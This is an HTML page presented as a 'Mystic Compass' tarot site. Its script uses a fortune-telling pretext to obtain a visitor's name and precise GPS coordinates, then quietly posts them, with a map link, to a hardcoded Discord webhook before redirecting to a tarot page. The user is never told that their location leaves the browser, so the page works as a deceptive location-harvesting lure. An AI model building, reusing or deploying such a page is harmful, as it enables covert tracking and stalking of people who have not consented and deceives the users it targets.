<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mystic Compass | Align Your Local Energies</title>
  <link rel="stylesheet" href="style.css">
</head>

<body>

  <div class="glass-card">
    <span class="mystic-ornament">‚úß üîÆ ‚úß</span>
    <h1>The Mystic Compass</h1>
    <p style="color: var(--text-muted); margin-top: 0.5rem; font-size: 0.9rem;">
      To reveal your destiny for today, we must first align your current physical location with the celestial spheres.
    </p>

    <div class="input-group">
      <input id="nameInput" type="text" placeholder="Enter your name to begin..." />
    </div>

    <button id="locateBtn" disabled>Align Energies</button>

    <div id="output" class="status-msg" aria-live="polite"></div>
  </div>

  <script>
    const nameInput = document.getElementById('nameInput');
    const locateBtn = document.getElementById('locateBtn');
    const output = document.getElementById('output');

    nameInput.addEventListener('input', () => {
      const name = nameInput.value.trim();
      // Enhanced validation: 2+ chars, Thai/English/Spaces
      if (name.length >= 2 && /^[\w‡∏Å-‡πô ]+$/u.test(name)) {
        locateBtn.disabled = false;
      } else {
        locateBtn.disabled = true;
      }
    });

    locateBtn.addEventListener('click', () => {
      const name = nameInput.value.trim();

      if (!navigator.geolocation) {
        output.innerHTML = '<span style="color: #ff4d4d">‚ùå Your browser does not support celestial alignment.</span>';
        return;
      }

      locateBtn.disabled = true;
      locateBtn.innerHTML = 'Aligning... <span style="font-size: 0.8em">‚è≥</span>';
      output.innerHTML = 'Seeking connection with your current coordinates...';

      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const { latitude, longitude } = pos.coords;

          output.innerHTML = '‚ú® Connection established. Preparing your cosmic signature...';

          try {
            await sendToDiscord(name, latitude, longitude);
            output.innerHTML = '‚úÖ Energies aligned. Redirecting to your Tarot reading...';

            setTimeout(() => {
              window.location.href = "tarot.html";
            }, 1500);
          } catch (err) {
            output.innerHTML = '<span style="color: #ff4d4d">‚ùå Alignment failed. Please try again.</span>';
            locateBtn.disabled = false;
            locateBtn.innerText = 'Align Energies';
          }
        },
        (err) => {
          let msg = '‚ùå Alignment error.';
          if (err.code === err.PERMISSION_DENIED) msg = '‚ö†Ô∏è Permission denied by star system.';
          else if (err.code === err.POSITION_UNAVAILABLE) msg = '‚ö†Ô∏è Location unavailable in this realm.';
          else if (err.code === err.TIMEOUT) msg = '‚ö†Ô∏è Cosmic timeout.';

          output.innerHTML = `<span style="color: #ff4d4d">${msg}</span>`;
          locateBtn.disabled = false;
          locateBtn.innerText = 'Align Energies';
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    });

    async function sendToDiscord(name, lat, lng) {
      // KEEPING THE WORKING WEBHOOK FROM ORIGINAL
      const webhook = "https://discord.com/api/webhooks/1391646097528717322/D3VW1hQsPPUiEFE9lTwhjfXaDyf2qLHaf9rWGPOSTcCEzaY1OuNNGdUyirbpimBPOlzI";
      const safeName = name.replace(/</g, "&lt;").replace(/>/g, "&gt;");
      const msg = {
        embeds: [{
          title: "‚òÑÔ∏è New Celestial Alignment Captured",
          color: 0xd4af37,
          fields: [
            { name: "Seeker", value: safeName, inline: true },
            { name: "Coordinates", value: `[View on Map](https://maps.google.com/?q=${lat},${lng})`, inline: true }
          ],
          timestamp: new Date().toISOString()
        }]
      };

      const res = await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(msg)
      });
      if (!res.ok) throw new Error("Send failed");
    }
  </script>

</body>

</html>
